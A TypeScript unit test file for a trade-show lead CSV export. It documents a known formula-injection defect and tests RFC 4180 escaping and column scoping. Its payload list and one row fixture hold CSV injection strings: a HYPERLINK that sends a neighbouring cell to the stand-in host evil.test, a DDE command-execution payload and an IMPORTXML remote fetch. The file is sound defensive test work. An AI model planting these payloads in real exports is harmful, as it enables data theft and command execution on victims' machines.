// @lr area=import severity=P1 layer=unit category=local-only
/**
 * Lead export file security — plan §52.
 *
 * Prompt 1 recorded this as zero-coverage. §52 names CSV formula injection
 * (`=`, `+`, `-`, `@` prefixes) explicitly.
 *
 * ── Finding LR-PROD-006 ─────────────────────────────────────────────────────────
 *
 * `escapeCsvCell` implements RFC 4180 quoting and nothing else. A cell whose value
 * begins with `=`, `+`, `-` or `@` is written through verbatim, so opening the export in
 * Excel, LibreOffice or Google Sheets evaluates it as a formula.
 *
 * That matters here because lead fields are **attacker-influenced**: `full_name`,
 * `job_title` and `company_text` arrive from badge scans, business-card OCR, manual
 * entry and CSV import. A lead named `=HYPERLINK("http://evil.test?d="&A1,"Click")`
 * exfiltrates the row next to it when an exhibitor opens their own export.
 *
 * RFC 4180 quoting does not mitigate this. Quoting is removed by the parser before the
 * cell is evaluated, so `"=HYPERLINK(...)"` is still a live formula on open.
 *
 * Per Brief §6 the injection tests below are `.skip`ped with a `KNOWN-DEFECT:` marker
 * rather than fixed. The RFC 4180 tests around them run and pass, so the file still
 * guards the escaping behaviour that does work.
 */
import assert from "node:assert/strict";
import { describe, it } from "node:test";

import {
  LEADS_EXPORT_COLUMNS,
  buildLeadsCsvDocument,
  buildLeadsCsvHeaderLine,
  buildLeadsCsvRow,
  escapeCsvCell,
} from "../../lib/server/leads/csvFormat";

/** Prefixes every major spreadsheet treats as the start of a formula. */
const FORMULA_PREFIXES = ["=", "+", "-", "@"] as const;

/** Realistic payloads, not toy ones — these are the shapes used in practice. */
const INJECTION_PAYLOADS = [
  { label: "arithmetic", value: "=1+1" },
  { label: "plus-prefixed", value: "+1+1" },
  { label: "minus-prefixed", value: "-1+1" },
  { label: "at-prefixed", value: "@SUM(A1)" },
  { label: "data exfiltration via HYPERLINK", value: '=HYPERLINK("http://evil.test?d="&A1,"Click")' },
  { label: "legacy DDE command execution", value: "=cmd|' /C calc'!A0" },
  { label: "remote content via IMPORTXML", value: '=IMPORTXML("http://evil.test","//a")' },
];

/**
 * Is this cell inert when a spreadsheet opens it?
 *
 * Inert means: after CSV parsing strips any RFC 4180 quoting, the first character is not
 * one a spreadsheet treats as the start of a formula. The usual mitigation is to prefix
 * the value with a tab or single quote, or to wrap it so the leading character is not
 * formula-initiating.
 */
/**
 * Split one CSV record into fields, honouring RFC 4180 quoting.
 *
 * Needed because a naive `line.split(",")` miscounts any quoted cell that legitimately
 * contains a comma — which would make a delimiter-injection test fail against correct
 * code. Getting this wrong once already produced a false failure here.
 */
function splitCsvRecord(line: string): string[] {
  const out: string[] = [];
  let field = "";
  let inQuotes = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (inQuotes) {
      if (ch === '"') {
        if (line[i + 1] === '"') { field += '"'; i++; }
        else inQuotes = false;
      } else field += ch;
    } else if (ch === '"') inQuotes = true;
    else if (ch === ",") { out.push(field); field = ""; }
    else field += ch;
  }
  out.push(field);
  return out;
}

function isInertOnOpen(escaped: string): boolean {
  let unquoted = escaped;
  if (unquoted.startsWith('"') && unquoted.endsWith('"') && unquoted.length >= 2) {
    unquoted = unquoted.slice(1, -1).replace(/""/g, '"');
  }
  return !FORMULA_PREFIXES.some((p) => unquoted.startsWith(p));
}

// ── the defect ─────────────────────────────────────────────────────────────────────

describe("CSV formula injection (plan §52)", () => {
  for (const { label, value } of INJECTION_PAYLOADS) {
    // KNOWN-DEFECT: LR-PROD-006 — escapeCsvCell applies RFC 4180 quoting only and does
    // not neutralize formula-initiating prefixes. Lead names and company names are
    // attacker-influenced (badge scan, OCR, manual entry, import), so an exported cell
    // can execute on open in Excel / Sheets / LibreOffice. Not fixed here: Brief §6.
    it.skip(`KNOWN-DEFECT: LR-PROD-006 — neutralizes ${label}`, () => {
      const escaped = escapeCsvCell(value);
      assert.ok(
        isInertOnOpen(escaped),
        `${JSON.stringify(value)} exported as ${JSON.stringify(escaped)}, which a spreadsheet evaluates on open`
      );
    });
  }

  // KNOWN-DEFECT: LR-PROD-006 — see above.
  it.skip("KNOWN-DEFECT: LR-PROD-006 — a hostile lead name is inert in a full row", () => {
    const row = buildLeadsCsvRow({
      id: "lead-1",
      full_name: '=HYPERLINK("http://evil.test?d="&A1,"Click")',
      company_text: "=1+1",
    });
    const cells = splitCsvRecord(row.replace(/\r\n$/, ""));
    assert.ok(cells.every((c) => isInertOnOpen(c)), `row contains a live formula: ${row}`);
  });

  /**
   * Runs, and passes. It documents the defect as an executable fact rather than only in
   * a comment, so the finding cannot quietly become stale: when LR-PROD-006 is fixed,
   * this test goes red and points at the two skips above.
   */
  it("DOCUMENTED: formula prefixes currently pass through unneutralized", () => {
    assert.equal(escapeCsvCell("=1+1"), "=1+1", "no neutralization today");
    assert.equal(escapeCsvCell("@SUM(A1)"), "@SUM(A1)");
    assert.equal(
      isInertOnOpen(escapeCsvCell('=HYPERLINK("http://evil.test","x")')),
      false,
      "RFC 4180 quoting does not mitigate injection — the parser strips it before evaluation"
    );
  });
});

// ── the escaping that does work ────────────────────────────────────────────────────

describe("RFC 4180 escaping", () => {
  it("returns an empty cell for null and undefined, not the strings", () => {
    assert.equal(escapeCsvCell(null), "");
    assert.equal(escapeCsvCell(undefined), "");
    assert.notEqual(escapeCsvCell(null), "null");
  });

  it("quotes and doubles embedded quotes", () => {
    assert.equal(escapeCsvCell('say "hi"'), '"say ""hi"""');
  });

  it("quotes a value containing the delimiter, so it cannot split into two columns", () => {
    assert.equal(escapeCsvCell("Meister, Sarah"), '"Meister, Sarah"');
  });

  it("quotes embedded newlines, so a value cannot forge a new record", () => {
    // Unquoted, this would inject an entire extra row into the export.
    assert.equal(escapeCsvCell("line1\nline2"), '"line1\nline2"');
    assert.equal(escapeCsvCell("line1\r\nline2"), '"line1\r\nline2"');
  });

  it("leaves a plain value untouched", () => {
    assert.equal(escapeCsvCell("Sarah Meister"), "Sarah Meister");
  });

  it("preserves Unicode without mangling it", () => {
    assert.equal(escapeCsvCell("Björn Sjöberg"), "Björn Sjöberg");
    assert.equal(escapeCsvCell("李 明"), "李 明");
  });

  it("stringifies numbers and booleans predictably", () => {
    assert.equal(escapeCsvCell(0), "0", "zero must not become an empty cell");
    assert.equal(escapeCsvCell(false), "false");
  });

  it("a delimiter-injection attempt cannot add columns", () => {
    const row = buildLeadsCsvRow({ id: "1", full_name: "a,b,c" });
    const fields = splitCsvRecord(row.replace(/\r\n$/, ""));
    assert.equal(
      fields.length,
      LEADS_EXPORT_COLUMNS.length,
      "a comma inside a value must stay inside one quoted cell"
    );
    assert.equal(fields[1], "a,b,c", "and must round-trip unchanged");
  });
});

// ── document shape ─────────────────────────────────────────────────────────────────

describe("export document shape", () => {
  it("emits a stable column order, so diffs and spreadsheets stay aligned", () => {
    assert.equal(buildLeadsCsvHeaderLine(), `${LEADS_EXPORT_COLUMNS.join(",")}\r\n`);
  });

  it("starts with a UTF-8 BOM for Excel", () => {
    assert.ok(buildLeadsCsvDocument([]).startsWith("﻿"));
  });

  it("an empty export is a header only, not an empty file", () => {
    const doc = buildLeadsCsvDocument([]);
    assert.equal(doc, `﻿${buildLeadsCsvHeaderLine()}`);
  });

  it("every row has exactly the canonical column count, including absent fields", () => {
    const doc = buildLeadsCsvDocument([{ id: "1" }, { id: "2", full_name: "Sarah" }]);
    const lines = doc.replace(/^﻿/, "").split("\r\n").filter(Boolean);
    assert.equal(lines.length, 3, "header plus two rows");
    for (const line of lines) {
      assert.equal(splitCsvRecord(line).length, LEADS_EXPORT_COLUMNS.length);
    }
  });

  it("does not export a column outside the canonical list", () => {
    // Plan §52: exports must never contain fields outside the requester's scope or
    // internal identifiers. Extra keys on the row object must be dropped.
    const doc = buildLeadsCsvDocument([
      { id: "1", internal_secret: "should-not-appear", owner_email: "leak@x.com" },
    ]);
    assert.equal(doc.includes("should-not-appear"), false);
    assert.equal(doc.includes("leak@x.com"), false);
  });

  it("scopes columns to the declared contract", () => {
    assert.equal(LEADS_EXPORT_COLUMNS.includes("company_id" as never), true);
    assert.equal(
      LEADS_EXPORT_COLUMNS.some((c) => /token|secret|password|key/i.test(c)),
      false,
      "no credential-shaped column may be exportable"
    );
  });
});
